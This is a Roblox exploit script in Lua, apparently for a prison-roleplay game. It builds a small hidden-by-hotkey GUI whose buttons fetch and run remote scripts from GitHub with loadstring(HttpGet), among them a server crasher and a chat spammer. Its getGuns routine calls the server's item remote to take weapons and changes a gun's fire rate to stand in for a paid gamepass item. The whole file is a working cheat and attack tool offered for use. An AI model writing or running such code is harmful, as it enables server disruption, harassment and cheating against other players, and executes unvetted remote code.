-- Gui to Lua
-- Version: 3.2
-- Script Created by Balaonoob

FavoriteColor = Color3.fromRGB(140, 140, 140) --(Red, Green, Blue) from 0 to 255

local function getGuns()
	--Remington870--------------------------------------------
	game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP) --Remington 870
	----------------------------------------------------------

	--M4A1----------------------------------------------------
	if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
	else --If you don't have gamepass for M4A1 then you will get the converted AK-47
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP) 
		require(game.Players.LocalPlayer.Backpack:FindFirstChild("AK-47"):FindFirstChild("GunStates"))["FireRate"] = 0.09
	end
	----------------------------------------------------------
	
	--AK-47---------------------------------------------------
	if (game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 96651)) then
		--If you don't have gamepass for M4A1 then you will not get this AK-47
		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
	end
	----------------------------------------------------------
	
	--M9---------------------------------------------------
	game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
	if game.Players.LocalPlayer:FindFirstChild("M9") then
		game.Players.LocalPlayer:FindFirstChild("M9").Parent = game.Players.LocalPlayer.Backpack
	end
	-------------------------------------------------------
end

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local ObGuns = Instance.new("TextButton")
local NexusTP = Instance.new("TextButton")
local BeGuardF = Instance.new("TextButton")
local BeInmate = Instance.new("TextButton")
local BeCriminal = Instance.new("TextButton")
local BeNeutral = Instance.new("TextButton")
local YardTP = Instance.new("TextButton")
local BeGuard = Instance.new("TextButton")
local ChatEnabled = true
local BubblesEnabled = true

--Properties:
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame.BorderColor3 = FavoriteColor
Frame.BorderSizePixel = 1
Frame.Position = UDim2.new(0.8, 25, 0, 0)
Frame.Size = UDim2.new(0, 20, 0, 10)
Frame.BorderMode = "Inset"

BeGuardF.Name = "BeGuardF"
BeGuardF.Parent = Frame
BeGuardF.AnchorPoint = Vector2.new(0.5, 0.5)
BeGuardF.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
BeGuardF.BorderColor3 = FavoriteColor
BeGuardF.BorderSizePixel = 2
BeGuardF.Position = UDim2.new(1, 0, 0, 0)
BeGuardF.Size = UDim2.new(0, 20, 0, 10)
BeGuardF.SizeConstraint = Enum.SizeConstraint.RelativeXX
BeGuardF.ZIndex = 3
BeGuardF.Font = Enum.Font.SourceSans
BeGuardF.Text = "csh"
BeGuardF.TextColor3 = FavoriteColor
BeGuardF.TextSize = 25.000
BeGuardF.TextWrapped = true
BeGuardF.BorderMode = "Inset"

BeInmate.Name = "BeInmate"
BeInmate.Parent = Frame
BeInmate.AnchorPoint = Vector2.new(0.5, 0.5)
BeInmate.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
BeInmate.BorderColor3 = FavoriteColor
BeInmate.BorderSizePixel = 2
BeInmate.Position = UDim2.new(2, 0, 0, 0)
BeInmate.Size = UDim2.new(0, 20, 0, 10)
BeInmate.ZIndex = 3
BeInmate.Font = Enum.Font.SourceSans
BeInmate.Text = "sc"
BeInmate.TextColor3 = FavoriteColor
BeInmate.TextSize = 25.000
BeInmate.TextWrapped = true
BeInmate.BorderMode = "Inset"

BeCriminal.Name = "BeCriminal"
BeCriminal.Parent = Frame
BeCriminal.AnchorPoint = Vector2.new(0.5, 0.5)
BeCriminal.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
BeCriminal.BorderColor3 = FavoriteColor
BeCriminal.BorderSizePixel = 2
BeCriminal.Position = UDim2.new(3, 0, 0, 0)
BeCriminal.Size = UDim2.new(0, 20, 0, 10)
BeCriminal.ZIndex = 3
BeCriminal.Font = Enum.Font.SourceSans
BeCriminal.Text = ""
BeCriminal.TextColor3 = FavoriteColor
BeCriminal.TextSize = 25.000
BeCriminal.TextWrapped = true
BeCriminal.BorderMode = "Inset"

BeNeutral.Name = "BeNeutral"
BeNeutral.Parent = Frame
BeNeutral.AnchorPoint = Vector2.new(0.5, 0.5)
BeNeutral.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
BeNeutral.BorderColor3 = FavoriteColor
BeNeutral.BorderSizePixel = 2
BeNeutral.Position = UDim2.new(4, 0, 0, 0)
BeNeutral.Size = UDim2.new(0, 20, 0, 10)
BeNeutral.ZIndex = 3
BeNeutral.Font = Enum.Font.SourceSans
BeNeutral.Text = "sp"
BeNeutral.TextColor3 = FavoriteColor
BeNeutral.TextSize = 25.000
BeNeutral.TextWrapped = true
BeNeutral.BorderMode = "Inset"

BeGuard.Name = "BeGuard"
BeGuard.Parent = Frame
BeGuard.AnchorPoint = Vector2.new(0.5, 0.5)
BeGuard.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
BeGuard.BorderColor3 = FavoriteColor
BeGuard.BorderSizePixel = 2
BeGuard.Position = UDim2.new(5, 0, 0, 0)
BeGuard.Size = UDim2.new(0, 20, 0, 10)
BeGuard.SizeConstraint = Enum.SizeConstraint.RelativeXX
BeGuard.ZIndex = 3
BeGuard.Font = Enum.Font.SourceSans
BeGuard.Text = "-"
BeGuard.TextColor3 = FavoriteColor
BeGuard.TextSize = 25.000
BeGuard.TextWrapped = true
BeGuard.BorderMode = "Inset"

BeCriminal.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://github.com/cfreemepq/Roblox-Platform-Script/tree/main", true))()
end)

BeGuard.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cfreemepq/Roblox-Swim/main/Swim.lua", true))()
end)

BeGuardF.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cfreemepq/Roblox-Server-Crash/main/Crasher.lua", true))()
end)

BeInmate.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cfreemepq/Roblox-Chat-Spam/main/Spam.lua", true))()
end)

BeNeutral.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cfreemepq/Roblox-Super-Punch-/main/SPunch.lua", true))()
end)


ObGuns.MouseButton1Down:connect(function()	
	if game.Players.LocalPlayer.Team.Name == "Criminals" then 
		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
	end
	getGuns()
end)

game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
	if gameProcessedEvent then return end
	local children = Frame:GetChildren()
    if inputObject.KeyCode == Enum.KeyCode.Q then
    	if Frame.BackgroundTransparency == 0 then
			Frame.BackgroundTransparency = 1
			for i, child in ipairs(children) do
				print(child.Name)
				child.BackgroundTransparency = 1
				child.TextTransparency = 1
			end
		else
			Frame.BackgroundTransparency = 0
			for i, child in ipairs(children) do
				if child.Name ~= "Title" then
					child.BackgroundTransparency = 0
				end
				child.TextTransparency = 0
			end
		end
    end
	if inputObject.KeyCode == Enum.KeyCode.Z then
		if ChatEnabled then
			ChatEnabled = false
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
			for i, player in pairs(game.Players:GetPlayers()) do
				player:WaitForChild("PlayerScripts").BubbleChat.Disabled = true
				player:WaitForChild("PlayerGui").BubbleChat:Destroy()
			end
		else
			ChatEnabled = true
			game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
			for i, player in pairs(game.Players:GetPlayers()) do
				player:WaitForChild("PlayerScripts").BubbleChat.Disabled = false
			end
		end
	end
	if inputObject.KeyCode == Enum.KeyCode.Slash then
		ChatEnabled = true
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
	end
	if inputObject.KeyCode == Enum.KeyCode.X then
		if BubblesEnabled then
			BubblesEnabled = false
			for i, player in pairs(game.Players:GetPlayers()) do
				player:WaitForChild("PlayerScripts").BubbleChat.Disabled = true
				player:WaitForChild("PlayerGui").BubbleChat:Destroy()
			end
		else
			BubblesEnabled = true
			for i, player in pairs(game.Players:GetPlayers()) do
				player:WaitForChild("PlayerScripts").BubbleChat.Disabled = false
			end
		end
	end
	if inputObject.KeyCode == Enum.KeyCode.E then
		if game.Players.LocalPlayer.Team.Name == "Criminals" then 
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField") then return end
		end
		if (game.Players.LocalPlayer.Backpack:FindFirstChild("M9")) then
			game.Players.LocalPlayer.Backpack:FindFirstChild("M9").Parent = game.Players.LocalPlayer
		end
		if (game.Players.LocalPlayer.Backpack:FindFirstChild("Taser")) then
			game.Players.LocalPlayer.Backpack.Taser:Destroy()
		end
		if (game.Players.LocalPlayer.Backpack:FindFirstChild("Handcuffs")) then
			game.Players.LocalPlayer.Backpack.Handcuffs:Destroy()
		end
		getGuns()
	end
end)



function dragify(Frame)
dragToggle = nil
dragSpeed = 100000 -- You can edit this.
dragInput = nil
dragStart = nil
dragPos = nil

function updateInput(input)
Delta = input.Position - dragStart
Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
game:GetService("TweenService"):Create(Frame, TweenInfo.new(0), {Position = Position}):Play()
end

Frame.InputBegan:Connect(function(input)
if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
dragToggle = true
dragStart = input.Position
startPos = Frame.Position
input.Changed:Connect(function()
if (input.UserInputState == Enum.UserInputState.End) then
dragToggle = false
end
end)
end
end)

Frame.InputChanged:Connect(function(input)
if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
dragInput = input
end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
if (input == dragInput and dragToggle) then
updateInput(input)
end
end)
end

dragify(Frame)
